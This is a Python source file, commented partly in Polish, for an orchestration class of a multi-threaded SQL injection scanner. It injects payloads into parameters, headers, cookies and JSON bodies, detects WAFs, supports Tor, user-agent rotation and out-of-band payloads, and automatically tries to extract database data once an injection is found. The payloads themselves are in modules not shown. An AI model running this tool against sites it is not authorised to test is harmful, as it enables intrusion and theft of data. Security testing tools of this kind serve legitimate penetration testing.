"""
SQLiScanner - Main orchestration class for SQL Injection scanning
"""

import os
import time
import requests
import sys
import datetime
import logging
import re
import shutil
from threading import Lock, RLock, Thread
from typing import Dict, List, Tuple
from colorama import Fore, Style

from .payload_manager import PayloadManager
from .request_handler import RequestHandler
from .waf_detector import WafDetector
from .vulnerability_detector import VulnerabilityDetector
from .target_crawler import TargetCrawler
from .statistics_collector import StatisticsCollector

class ColoredFormatter(logging.Formatter):
    """Custom Formatter to add colors to log levels for console output"""
    LEVEL_COLORS = {
        logging.DEBUG: Fore.CYAN,
        logging.INFO: Fore.BLUE,
        logging.WARNING: Fore.YELLOW,
        logging.ERROR: Fore.RED,
        logging.CRITICAL: Fore.RED + Style.BRIGHT
    }

    def format(self, record):
        orig_levelname = record.levelname
        color = self.LEVEL_COLORS.get(record.levelno, Fore.WHITE)
        record.levelname = f"{color}[{orig_levelname}]{Style.RESET_ALL}"
        formatted = super().format(record)
        record.levelname = orig_levelname  # Restore original for other handlers
        return formatted


class SQLiScanner:
    """Główny skaner SQL Injection"""
    
    # Nagłówki i ciasteczka do testowania
    VULNERABLE_HEADERS = [
        "X-Forwarded-For", "X-Real-IP", "Client-IP", "Referer",
        "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr"
    ]
    
    VULNERABLE_COOKIES = [
        "id", "session", "user", "admin", "settings", "track", "lang", "uid", "role"
    ]
    
    # Stałe dla UI
    HEADER_HEIGHT = 13 # Adjusted to align with new UI layout
    LINES_PER_THREAD = 1

    def __init__(self, output_dir: str = "outputs", timeout: int = 5, threads: int = 1, 
                 use_tor: bool = False):
        """
        Inicjalizacja skanera
        
        Args:
            output_dir: Katalog do zapisywania raportów
            timeout: Timeout dla żądań HTTP
            threads: Liczba wątków
            use_tor: Czy używać Tor
        """
        self.output_dir = output_dir
        self.timeout = timeout
        self.threads = min(max(1, threads), 50)
        self.use_tor = use_tor
        
        # Stworzenie katalogów
        for d in [output_dir, "logs"]:
            if not os.path.exists(d):
                os.makedirs(d)

        # Initialize activity logger with a timestamped file
        self.activity_logger = logging.getLogger("sqlichecker.activity")
        self.activity_logger.setLevel(logging.DEBUG)
        
        # Clear existing handlers to prevent duplicate logs if SQLiScanner is instantiated multiple times
        if not self.activity_logger.handlers:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            log_filename = os.path.join("logs", f"activity_{timestamp}.log")
            
            # File Handler - Captures everything with detailed format
            file_handler = logging.FileHandler(log_filename, encoding='utf-8')
            file_formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
            file_handler.setFormatter(file_formatter)
            self.activity_logger.addHandler(file_handler)

        # Komponenty
        self.payload_manager = PayloadManager()
        self.request_handler = RequestHandler(use_tor=use_tor, timeout=timeout)
        self.waf_detector = WafDetector(self.request_handler.session)
        self.vulnerability_detector = VulnerabilityDetector()
        self.target_crawler = TargetCrawler(self.request_handler.session)
        self.statistics = StatisticsCollector()
        
        # State
        self.queries_done = 0
        self.total_queries = 0
        self.results_lock = Lock()
        self.output_lock = Lock()
        self.queries_lock = Lock()
        self.ui_lock = RLock()
        self.global_delay = 0.0
        self.side_log_buffer = []
        self.side_log_max = 20
        self.side_log_lock = Lock()
        self.delay_lock = Lock()
        self.event_log_buffer = []
        self.event_log_max = 10 # Max lines for event log at the bottom
        self.event_log_lock = Lock()
        
        # Dynamic Performance Scaling
        self.current_limit = self.threads
        self.latency_history = []
        self.target_latency = 1.5  # Ideal response time threshold in seconds
        self.limit_lock = Lock()
        
        # UI Thread & Buffers
        self.thread_status_buffer = [f"{Fore.WHITE}Idle"] * self.threads
        self.ui_thread = None
        self.ui_running = False
        self.oob_domain = os.getenv("OOB_DOMAIN", "interact.sh") # Można ustawić w .env
    
    def _strip_ansi(self, text: str) -> str:
        """Removes ANSI escape sequences (colors, cursor moves) for clean logging"""
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def scan_url(self, url: str, payload_mode: int = 3, custom_payloads: List[str] = None,
                scan_headers: bool = False, scan_cookies: bool = False, scan_post: bool = False,
                random_ua: bool = False, ua_rotation_interval: int = 5, thread_id: int = 0, # Removed line_offset from here
                expected_tests: int = 0) -> Dict:
        """
        Skanuje pojedynczy URL
        
        Args:
            url: URL do skanowania
            payload_mode: Tryb payloadów (1=Basic, 2=Advanced, 3=All, 4=Custom)
            custom_payloads: Własne payloady (dla mode 4)
            scan_headers: Skanować nagłówki
            scan_cookies: Skanować ciasteczka
            scan_post: Skanować POST data
            random_ua: Losowe User-Agenty
            ua_rotation_interval: Co ile żądań zmienić UA
            thread_id: ID wątku dla pozycjonowania logów w konsoli
            expected_tests: Przewidywana liczba testów dla tego URL (do progresu)
        
        Returns:
            Słownik z wynikami skanowania
        """
        url = self.request_handler.prepare_url(url)
        domain = self.request_handler.get_domain(url)
        
        result = {
            "url": url,
            "domain": domain,
            "online": False,
            "sqli_found": False,
            "status": None,
            "detected_tech": "Generic",
            "waf_status": "None",
            "vulnerabilities_count": 0
        }

        # Licznik wykonanych zadań dla tego URL (do wyrównania progresu na końcu)
        tasks_done = 0
        
        try:
            # Test dostępności
            try:
                headers = {"User-Agent": self.request_handler.current_ua}
                res = self.request_handler.get(url, headers=headers)
                
                # Inkrementacja za pierwszy request sprawdzający
                with self.queries_lock:
                    self.queries_done += 1
                tasks_done += 1

                result["status"] = res.status_code
                result["online"] = res.status_code < 500
                
                if res.status_code >= 200 and res.status_code < 600:
                    # Detekcja WAF i technologii
                    result["waf_status"] = self.waf_detector.detect_waf(url, headers, self.timeout)
                    result["detected_tech"] = self.waf_detector.detect_tech_from_headers(res.headers)
                    
                    # Skanowanie SQLi jeśli payload_mode > 0
                    if payload_mode > 0:
                        sqli_results = self._scan_sqli(
                            url, payload_mode, custom_payloads,
                            scan_headers, scan_cookies, scan_post,
                            random_ua, ua_rotation_interval, result["detected_tech"],
                            thread_id=thread_id
                        )
                        result["sqli_found"] = sqli_results["found"]
                        result["vulnerabilities_count"] = sqli_results["count"]
                        tasks_done += sqli_results["count"] # _scan_sqli już inkrementuje queries_done
                    
                    # Zapisz status online tylko jeśli nie znaleziono podatności (aby uniknąć duplikacji z raportem szczegółowym)
                    if not result["sqli_found"] and result["status"] and result["status"] < 500:
                        self._write_result(f"[ONLINE] {url}")
                        
            except requests.exceptions.RequestException as e:
                # Spróbuj HTTPS jeśli HTTP nie działa
                if url.startswith('http://'):
                    url_https = url.replace('http://', 'https://')
                    try:
                        res = self.request_handler.get(url_https, headers=headers)
                        result["url"] = url_https
                        result["status"] = res.status_code
                        result["online"] = res.status_code < 500
                    except:
                        result["online"] = False
                else:
                    result["online"] = False
        
        except Exception as e:
            self._update_thread_ui(thread_id, f"{Fore.RED}✘ CRITICAL ERROR: {domain} | {str(e)[:40]}", level=logging.ERROR) # No line_offset here
            result["online"] = False
        
        # Wyrównanie paska progresu jeśli URL był offline lub pominął testy
        remaining = expected_tests - tasks_done
        if remaining > 0:
            with self.queries_lock:
                self.queries_done += remaining

        # Po zakończeniu skanowania przez wątek, oznaczamy to w jego sekcji
        status_color = Fore.GREEN if result["sqli_found"] else Fore.WHITE
        msg = f"{status_color}✔ FINISHED: {domain} | SQLi: {result['vulnerabilities_count']}"
        self._update_thread_ui(thread_id, msg.ljust(80))
        
        return result
    
    def _determine_parameter_context(self, url: str) -> Dict[str, str]:
        """
        Wykonuje szybkie testy, aby określić kontekst parametrów (Numeric vs String)
        """
        contexts = {}
        parsed = self.request_handler.urlparse(url)
        params = self.request_handler.parse_qs(parsed.query)
        
        # Baseline
        try:
            baseline = self.request_handler.get(url).text
        except: return {}

        for param in params:
            # Test numeryczny: param - 0
            test_val = f"{params[param][0]}-0"
            test_url = url.replace(f"{param}={params[param][0]}", f"{param}={test_val}")
            try:
                resp = self.request_handler.get(test_url).text
                if self.vulnerability_detector.analyze_context(resp, baseline, "numeric") == "NUMERIC":
                    contexts[param] = "NUMERIC"
                    continue
            except: pass

            # Test string: param'
            test_val = f"{params[param][0]}'"
            test_url = url.replace(f"{param}={params[param][0]}", f"{param}={test_val}")
            try:
                resp = self.request_handler.get(test_url).text
                if self.vulnerability_detector.analyze_context(resp, baseline, "string") == "STRING_QUOTED":
                    contexts[param] = "STRING"
                    continue
            except: pass
            
            contexts[param] = "GENERIC"
        return contexts

    def _scan_sqli(self, url: str, payload_mode: int, custom_payloads: List[str],
                  scan_headers: bool, scan_cookies: bool, scan_post: bool,
                  random_ua: bool, ua_rotation_interval: int, detected_tech: str,
                  thread_id: int) -> Dict:
        """
        Skanuje pojedynczy URL w poszukiwaniu SQLi
        
        """
        # 1. Rozpoznanie kontekstu
        param_contexts = self._determine_parameter_context(url)
        
        payloads = self.payload_manager.get_payloads_by_mode(payload_mode, detected_tech, custom_payloads)
        oob_payloads = self.payload_manager.get_oob_payloads(self.oob_domain, detected_tech)
        
        result = {"found": False, "count": 0}
        
        # Pobierz baseline response
        baseline_response = ""
        baseline_status = 200
        baseline_len = 0
        captured_cookies = {}
        
        try:
            headers = {"User-Agent": self.request_handler.current_ua}
            res = self.request_handler.get(url, headers=headers)
            baseline_response = res.text.lower()
            baseline_status = res.status_code
            baseline_len = len(res.text)
            captured_cookies = self.request_handler.session.cookies.get_dict()
        except:
            pass
        
        # Jeśli brak ciasteczek, dodaj popularne
        if not captured_cookies:
            captured_cookies = {name: "1" for name in self.VULNERABLE_COOKIES[:3]}
        
        test_cases = []
        for payload in (payloads + oob_payloads):
            # Optymalizacja kontekstowa dla parametrów URL
            for test_url, param_name in self.request_handler.inject_payload_to_url(url, payload):
                context = param_contexts.get(param_name, "GENERIC")
                
                # Pomiń niepasujące payloady (np. cudzysłowy dla liczb)
                if context == "NUMERIC" and any(c in payload for c in ["'", '"']):
                    continue
                
                test_cases.append({
                    "type": "param", "url": test_url, "target": param_name, "payload": payload,
                    "headers": {"User-Agent": self.request_handler.current_ua}, "cookies": None
                })
            
            # Testy nagłówków
            if scan_headers:
                for header_name in self.VULNERABLE_HEADERS:
                    test_cases.append({
                        "type": "header",
                        "url": url,
                        "target": header_name,
                        "payload": payload,
                        "headers": {"User-Agent": self.request_handler.current_ua, header_name: payload},
                        "cookies": None
                    })
            
            # Testy ciasteczek
            if scan_cookies:
                for cookie_name in captured_cookies:
                    test_cases.append({
                        "type": "cookie",
                        "url": url,
                        "target": cookie_name,
                        "payload": payload,
                        "headers": {"User-Agent": self.request_handler.current_ua},
                        "cookies": {**captured_cookies, cookie_name: payload}
                    })
            
            # Testy POST (JSON Body)
            if scan_post:
                parsed = self.request_handler.urlparse(url)
                params = self.request_handler.parse_qs(parsed.query)
                
                # Używamy parametrów URL jako bazy dla kluczy JSON (standard w API)
                base_json = {k: v[0] for k, v in params.items()} if params else {"id": "1"}
                
                for key in base_json:
                    json_payload = base_json.copy()
                    json_payload[key] = f"{base_json[key]}{payload}"
                    test_cases.append({
                        "type": "json",
                        "url": url,
                        "target": f"JSON:{key}",
                        "payload": payload,
                        "json_body": json_payload,
                        "headers": {"User-Agent": self.request_handler.current_ua},
                        "cookies": captured_cookies
                    })
        
        # Wykonanie testów sekwencyjnie wewnątrz wątku (wątek = jedna strona)
        total_tests = len(test_cases)
        for idx, test in enumerate(test_cases, 1):
            progress = f"[{idx}/{total_tests}]"
            self._update_thread_ui(thread_id, f"{Fore.CYAN}{progress} {Fore.WHITE}Testing {test['target']} on {self.request_handler.get_domain(url)}")
            
            try:
                is_vulnerable, method_info = self._test_single_case(
                    test, baseline_response, baseline_status, baseline_len
                )
                
                if is_vulnerable:
                    result["found"] = True
                    result["count"] += 1
                    self.statistics.record_vulnerability_type(method_info)
                    self._add_event_log(f"{Fore.GREEN}[!] FOUND {method_info} on {test['target']} for {self.request_handler.get_domain(url)}")
                    
                    # 2. Automatyczna eksploatacja po wykryciu
                    self._extract_data(test, detected_tech, thread_id)
                    
            except Exception:
                pass
        
        return result

    def _extract_data(self, test_case: Dict, tech: str, thread_id: int) -> None:
        """Próbuje wyciągnąć podstawowe dane z bazy"""
        extract_payloads = self.payload_manager.get_extraction_payloads(tech)
        
        for p in extract_payloads:
            self._add_event_log(f"{Fore.YELLOW}[*] Attempting data extraction for {self.request_handler.get_domain(test_case['url'])}")
            try:
                # Prosta próba - wstrzyknij payload do tego samego celu co błąd
                if test_case["type"] == "param":
                    # Budujemy URL z payloadem ekstrakcyjnym
                    # (Logika uproszczona: zamieniamy oryginalny payload na ekstrakcyjny)
                    target_url = test_case["url"].replace(test_case["payload"], p)
                    res = self.request_handler.get(target_url)
                    
                    # Szukaj wzorców wersji (np. cyfry z kropkami) lub specyficznych błędów
                    if any(char.isdigit() for char in res.text[:500]) and len(res.text) > 10: # Added len check to avoid empty responses
                        self._add_event_log(f"{Fore.GREEN}[+] DATA: {res.text[:60].strip()}... from {self.request_handler.get_domain(test_case['url'])}")
                        # Zapisz do statystyk jako sukces eksploatacji
                        break
            except:
                continue

    def _initialize_ui_area(self) -> None:
        """Prints initial empty lines to reserve space for dynamic UI elements."""
        with self.ui_lock:
            # Empty line for progress bar
            sys.stdout.write("\n") 
            # Empty line after progress bar
            sys.stdout.write("\n")
            # Empty lines for thread statuses
            for _ in range(self.threads * self.LINES_PER_THREAD):
                sys.stdout.write("\n")
            # Empty line between threads and event log
            sys.stdout.write("\n")
            # Empty lines for event log
            for _ in range(self.event_log_max):
                sys.stdout.write("\n")
            sys.stdout.flush()
            # Move cursor back to the start of the progress bar line
            sys.stdout.write(f"\033[9;1H")
            sys.stdout.flush()

    def _draw_global_progress(self) -> None:
        """Draws the global progress bar in the header section (Line 9)"""
        if self.total_queries <= 0:
            return
            
        percent = min(100.0, (self.queries_done / self.total_queries) * 100)
        bar_width = 50
        filled = int(bar_width * percent / 100)
        bar = Fore.GREEN + '█' * filled + Fore.BLACK + '░' * (bar_width - filled)
        
        sys.stdout.write("\033[9;1H\033[K") # Adjusted line for progress bar
        sys.stdout.write(f"{Fore.YELLOW}  PROGRESS: {Fore.WHITE}[{bar}{Fore.WHITE}] {percent:.1f}% ({self.queries_done}/{self.total_queries}) | {Fore.CYAN}ACTIVE: {self.current_limit}/{self.threads}")

    def _add_side_log(self, message: str) -> None:
        """Dodaje szczegółową informację do bocznego panelu logów"""
        with self.side_log_lock:
            timestamp = time.strftime('%H:%M:%S')
            self.side_log_buffer.append(f"{Fore.BLUE}[{timestamp}]{Style.RESET_ALL} {message}")
            if len(self.side_log_buffer) > self.side_log_max:
                self.side_log_buffer.pop(0)

    def _add_event_log(self, message: str) -> None:
        """Adds a detailed event message to the bottom panel logs"""
        with self.event_log_lock:
            timestamp = time.strftime('%H:%M:%S')
            self.event_log_buffer.append(f"{Fore.MAGENTA}[{timestamp}]{Style.RESET_ALL} {message}")
            if len(self.event_log_buffer) > self.event_log_max:
                self.event_log_buffer.pop(0)

    def start_ui(self) -> None:
        """Starts the dedicated UI refresh thread (10Hz)"""
        if not self.ui_running:
            self.ui_running = True
            self.ui_thread = Thread(target=self._ui_refresh_loop, daemon=True)
            self.ui_thread.start()

    def stop_ui(self) -> None:
        """Stops the UI refresh thread"""
        self.ui_running = False
        if self.ui_thread:
            self.ui_thread.join(timeout=1.0)

    def _ui_refresh_loop(self) -> None:
        """Main loop for the UI thread ensuring smooth updates"""
        while self.ui_running:
            self._draw_full_ui()
            time.sleep(0.1) # 10 FPS
        self._draw_full_ui() # Final frame

    def _draw_full_ui(self) -> None:
        """Orchestrates drawing all UI elements in a thread-safe manner"""
        term_size = shutil.get_terminal_size()
        split_col = 85
        
        with self.ui_lock:
            self._draw_global_progress()
            
            # Draw Side Panel Header
            if term_size.columns > split_col:
                sys.stdout.write(f"\033[11;{split_col}H{Fore.CYAN}{Style.BRIGHT}║ LIVE AUDIT FEED (DETAILED LOGS)\033[K")

            side_logs = []
            with self.side_log_lock:
                side_logs = self.side_log_buffer.copy()

            for i in range(self.threads):
                line_pos = self.HEADER_HEIGHT + i
                status = self.thread_status_buffer[i]
                
                # Format thread status (Truncate to prevent wrap)
                clean_status = status[:split_col-15]
                thread_line = f"{Fore.MAGENTA}  Thread-{i:02} | {Style.RESET_ALL}{clean_status}"
                
                # Pad to split_col
                visible_len = len(self._strip_ansi(thread_line))
                padding = " " * max(0, split_col - visible_len - 1)
                
                sys.stdout.write(f"\033[{line_pos};1H{thread_line}{padding}")
                
                # Attach side log to the same line if terminal is wide enough
                if term_size.columns > split_col:
                    log_text = side_logs[i] if i < len(side_logs) else ""
                    max_log_len = term_size.columns - split_col - 2
                    sys.stdout.write(f"{Fore.CYAN}║ {Style.RESET_ALL}{log_text[:max_log_len]}\033[K")

            # Draw Event Panel at bottom
            with self.event_log_lock:
                events_to_draw = self.event_log_buffer.copy()
            
            start_line = self.HEADER_HEIGHT + self.threads + 1
            for i in range(self.event_log_max):
                current_line = start_line + i
                sys.stdout.write(f"\033[{current_line};1H\033[K")
                if i < len(events_to_draw):
                    sys.stdout.write(events_to_draw[i][:term_size.columns-1])
            
            # Park cursor below UI
            park_pos = start_line + self.event_log_max + 1
            if park_pos > term_size.lines: park_pos = term_size.lines
            sys.stdout.write(f"\033[{park_pos};1H")
            sys.stdout.flush()

    def _update_thread_ui(self, thread_id: int, message: str, level: int = logging.INFO) -> None:
        """Updates internal status buffer and logs. UI is drawn by the refresh thread."""
        # Log to activity log
        log_entry = f"Thread-{thread_id:02} | {self._strip_ansi(message)}"
        self.activity_logger.log(level, log_entry)

        # Update buffer for refresh thread
        if 0 <= thread_id < self.threads:
            self.thread_status_buffer[thread_id] = message
    
    def _test_single_case(self, test_case: Dict, baseline_response: str, 
                         baseline_status: int, baseline_len: int) -> Tuple[bool, str]:
        """Testuje pojedynczy przypadek"""
        try:
            # Smart-delay
            if self.global_delay > 0:
                time.sleep(self.global_delay)

            # Inkrementacja licznika zapytań
            with self.queries_lock:
                self.queries_done += 1

            # Dynamic Throttling: introduce sleep if current_limit is scaled down
            # This effectively lowers the concurrent processing power across the pool
            with self.limit_lock:
                if self.current_limit < self.threads:
                    time.sleep(0.2 * (self.threads - self.current_limit))

            start_time = time.time()
            
            if test_case["type"] == "post":
                res = self.request_handler.post(
                    test_case["url"],
                    data={test_case["target"]: test_case["payload"]},
                    headers=test_case["headers"],
                    cookies=test_case["cookies"]
                )
            elif test_case["type"] == "json":
                res = self.request_handler.post(
                    test_case["url"],
                    json=test_case["json_body"],
                    headers=test_case["headers"],
                    cookies=test_case["cookies"]
                )
            else:
                res = self.request_handler.get(
                    test_case["url"],
                    headers=test_case["headers"],
                    cookies=test_case["cookies"]
                )
            
            duration = time.time() - start_time
            
            # Dodaj szczegółowy log do panelu bocznego
            status_color = Fore.GREEN if res.status_code == 200 else Fore.YELLOW
            detail_msg = f"{test_case['type'].upper()} | {test_case['target']} | {status_color}{res.status_code}{Style.RESET_ALL} | {duration:.2f}s"
            self._add_side_log(detail_msg)
            
            # Update latency stats and adjust scaling
            self._adjust_concurrency(duration)
            
            # Detekcja podatności
            is_vulnerable, method_info = self.vulnerability_detector.detect_vulnerability(
                res.text, baseline_response, test_case["payload"],
                duration, 0, res.status_code, baseline_status, baseline_len
            )
            
            if is_vulnerable:
                # Pobranie skrawka rezultatu (snippet)
                snippet = res.text[:250].replace('\n', ' ').strip() + "..."
                self._write_vulnerability_report(
                    url=test_case["url"],
                    target=test_case["target"],
                    method=method_info,
                    payload=test_case["payload"],
                    snippet=snippet
                )
                self.statistics.add_vulnerability({
                    "domain": self.request_handler.get_domain(test_case["url"]),
                    "url": test_case["url"],
                    "payload": test_case["payload"],
                    "method": method_info,
                    "target": f"{test_case['type']}: {test_case['target']}",
                    "time": time.strftime('%H:%M:%S')
                })
                self.statistics.record_effective_payload(test_case["payload"])
            
            return is_vulnerable, method_info
        
        except Exception as e:
            self.activity_logger.debug(f"Test case failed: {str(e)}")
            return False, ""

    def _adjust_concurrency(self, last_duration: float) -> None:
        """Scales the internal concurrency limit based on moving average latency"""
        with self.limit_lock:
            self.latency_history.append(last_duration)
            if len(self.latency_history) > 15:
                self.latency_history.pop(0)
            
            if len(self.latency_history) < 5:
                return

            avg_latency = sum(self.latency_history) / len(self.latency_history)
            
            # Scale down if latency exceeds 2x the target (server slowing down)
            if avg_latency > (self.target_latency * 2.0) and self.current_limit > 1:
                self.current_limit -= 1
                self._add_side_log(f"{Fore.RED}⚠ Latency High ({avg_latency:.2f}s). Scaling down to {self.current_limit} effective threads.")
                self.latency_history = [] # Reset history to stabilize at the new level
            
            # Scale up if latency is healthy (under 80% of target)
            elif avg_latency < (self.target_latency * 0.8) and self.current_limit < self.threads:
                self.current_limit += 1
                self._add_side_log(f"{Fore.CYAN}ℹ Server Responsive ({avg_latency:.2f}s). Restoring to {self.current_limit} threads.")
                self.latency_history = []
    
    def _write_result(self, message: str) -> None:
        """Zapisuje podstawowy wynik (np. status online) do pliku"""
        with self.output_lock:
            try:
                output_file = os.path.join(self.output_dir, "results.txt")
                with open(output_file, "a", encoding="utf-8") as f:
                    f.write(message + "\n")
            except Exception as e:
                pass

    def _write_vulnerability_report(self, url: str, target: str, method: str, payload: str, snippet: str) -> None:
        """Zapisuje szczegółowy raport o znalezionej podatności do pliku results.txt"""
        with self.output_lock:
            try:
                output_file = os.path.join(self.output_dir, "results.txt")
                with open(output_file, "a", encoding="utf-8") as f:
                    f.write(f"\n[!] SQLi DETECTED - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Target URL: {url}\n")
                    f.write(f"Injection Point: {target}\n")
                    f.write(f"Method: {method}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write(f"Response Snippet: {snippet}\n")
                    f.write("-" * 60 + "\n")
            except Exception:
                pass
    
    def crawl_and_discover(self, start_urls: List[str], max_depth: int = 1) -> set:
        """
        Crawluje strony odkrywając linki z parametrami
        
        Args:
            start_urls: Lista początkowych URLi
            max_depth: Maksymalna głębokość crawlowania
        
        Returns:
            Set znalezionych linków z parametrami
        """
        return self.target_crawler.crawl_recursive(start_urls, max_depth, self.threads)
    
    def get_statistics(self) -> Dict:
        """Zwraca statystyki ze skanowania"""
        return self.statistics.get_summary()
    
    def print_statistics(self) -> None:
        """Wyświetla podsumowanie statystyk"""
        self.statistics.print_summary()
